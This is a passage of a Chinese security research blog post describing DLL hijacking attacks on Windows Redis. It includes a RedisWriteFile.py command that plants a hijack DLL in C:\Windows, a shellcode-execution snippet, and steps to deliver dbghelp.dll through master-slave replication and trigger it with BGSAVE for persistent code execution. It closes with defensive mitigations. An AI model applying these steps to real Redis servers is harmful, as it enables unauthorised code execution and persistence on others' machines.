因为 redis 是 `Administrator` 启动的，所以我们可以写入劫持文件到 `C:\Windows`
    python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56.1 --rpath="C:\Windows" --rfile="mstlsapi.dll" --lfile="/tmp/mstlsapiJ.dll"
这里需要注意，因为连接是调用是 `NETWORK SERVICE` 权限的svchost 所以 `calc` 并不会在当前用户桌面弹出。  
接下去连接，发现的确触发了计算器的调用。
从调用情况，可以看出 `C:\Windows\mstlsapi.dll` 是加载成功了。
>
> 这里需要注意，在这个场景中当`LoadLibrary`完正常dll后，需要在Hijack函数后做一次`FreeLibrary`的操作，不然就会出现只能利用一次的情况，因为我们这里是通过DLLMain函数进入然后再最后转发完所有函数进行劫持，  
>  而当前DLL
> 一旦被宿主进程加载之后，就会保持在内存中，将DLL引入进程空间，随后的重复调用不会再次进入DLLMain，而只是增加`引用计数`,这样就导致不会触发到我们的Hijack函数，有些情况原函数内部会帮助我们Free。
工程中的 Shellcode
加载方式是创建新的进程然后加载，可能并不会有好的免杀效果，这是只是想提，作者之所以选择创建新的进程是因为这里不能让原本转发阻塞，否则整个DLL加载将会失败。自己在测试的时候不建议直接使用单纯的shellcode加载,比如常见的:
    memcpy(p, shellcode, sizeof(shellcode));
    CODE code = (CODE)p;
    code();
也需要使用类似创建进程或者注入进程的方式来操作，不要让DLL加载卡住。
### 低权限 场景直接触发
借助其他服务来进行利用，相对来说还是比较被动，所以后续我主要去关注了redis本身，会不会在某些情况存在Dll劫持的问题。还有一点，高权限启动redis的情况有，但是最好还是能在低权限下能做一些事情。
所以我将环境默认安装，`Redis Service`会开机自启，权限为`Network Service`。  
那么单纯的 Redis shell 能做的并不多，我们可以尝试使用一些命令来观察执行过程。
命令比较多，所以我们主要关注 Server端的指令。  
在测试的过程中，我发现在使用 SYNC 命令时，发生了DLL 劫持的特征。  
可以发现，不止出现了一个DLL 未找到。  
放宽限制我们来细看一下。  
这里可以发现系统其实还去查询了 SafeDllSearchMode key值，但是因为从 Windows
7之后就采用KnownDLLs机制所以提示这个键值也是找不到的，但是并不影响DLL查找顺序。
  1. 进程对应的应用程序所在目录（可理解为程序安装目录比如`C:\ProgramFile\xxx`）；
  2. 系统目录（即`%windir%system32`）；
  3. 16位系统目录（即`%windir%system`）；
  4. Windows目录（即`%windir%`）；
  5. 当前目录（运行的某个文件所在目录，比如`C:\Documents and Settings\Administrator\Desktop\xxx`)
  6. PATH环境变量中的各个目录；
所以根据规则，`dbghelp.dll` 不在 `KnownDLLs List`
中，会先从安装目录下搜索，即使System32下已经存在了`dbghelp.dll`。
另外一个很幸运的事情是，默认的安装目录， `Network Service` 用户是拥有完全控制权限的。  
在利用的时候安装目录如何得知了？其实通过 info 就可以看到。  
因为权限问题，这里我们就不考虑 `symsrv.dll` ,因为他是需要在 System32 目录下进行劫持，接下去我们来看看 SYNC 命令。
熟悉主从复制的同学对 SYNC 命令并不会陌生，它主要是让从服务器同步 Master的数据，在2.8版本之后加入PSYNC
为了代替SYNC，场景是为了解决断线重连之后的全量复制低效的缺陷，同样PYSNC也是会产生`NAME NOT FOUNT`。
> 图来自   
>
> 
从同步流程图可以看出来，slaveof host port 命令之后，其实就会去直接执行
sync的操作，并且SYNC之后还会开始执行BGSAVE的指令，并会fork一个子进程，然后创建RDB文件（一个压缩过的二进制文件，可以通过该文件还原快照时的数据库状态）进行持久化。
于是我尝试直接执行 `BGSAVE` 命令，发现也是直接触发了`NAME NOT FOUNT`。
后来发现与之相关的 `BGREWRITEAOF`
命令也会有同样的效果，其实可能还会有更多的命令会有这种效果，但并没有全部测试。有了刚才利用3389进行劫持的基础，现在来利用这个应该就比较简单了。
### 再次利用
  1. 通过 DLLHijacker.py 生成sln 项目，并修改原DLL地址，这里直接引用 System32 下的dbghelp.dll，就不需要再传一个了。
  2. 将修改后劫持的DLL，通过主从复制传入 `C:\Program Files\Redis`。
  3. 连接redis, 执行bgsave。
可以看到执行了两次，并产生两个 calc 进程，这样就不需要被动等待DLL劫持带来的效果啦。  
在重启服务后，会自动加载此DLL，自动伴随持久化效果。  
文件已被加载，无法直接删除。  
### 总结&防御
  * 另外关于 Redis DLL劫持这个利用点，可能还有利用一些 Windows 周期性自动运行的服务引发的DLL劫持，也可以作为利用的点，比如 wmiprvse、searchindexer等等吧，具体也没研究，听铁师傅说起过。
  * 此利用还是依赖于写主从无损文件，所以内网利用可能问题不大，公网利用还是需要目标有出网的能力。
  * 还需注意的是，不同操作系统版本的 `dbghelp.dll` 存在差异，在制作的时候，最好使用相同版本的dll进行劫持。
测试情况：
  * [x] Windows Server 2012 / Redis 3.2.100
  * [x] Windows 7 / Redis 3.0.504
  * [x] Windows Server 2008 / Redis 2.8.2103
其他版本还需要自行测试。
如果自己写的程序也存在此类问题？防御方面很多文章也写了，这里就直接引用一下吧。
>   * 在加载 DLL 时尽量使用 DLL 的绝对路径
>   * 调用 SetDllDirectory(L"") 把 当前目录 从 DLL 搜索目录中排除
>   * 使用 LoadLibraryEx 加载 DLL 时，指定 LOAD_LIBRARY _SEARCH_ 系列标志
>   * 可以尝试去验证 DLL 的合法性，例如是否具有自家的合法数字签名、是否是合法的系统 DLL 文件等
>
最近事情比较多，断断续续写了写，不是什么好文，也可能有比较多错误，还望指正,感谢@CoColi的帮助。
## 补充
忘记说了一点就是关于主从复制清空数据的问题，后来得知 jkme 师傅[文章中](https://jkme.github.io/redis-on-windows-dll-hijack.html)最后使用到的 redis-dump-go，可以一定程度解决这个问题。
## Reference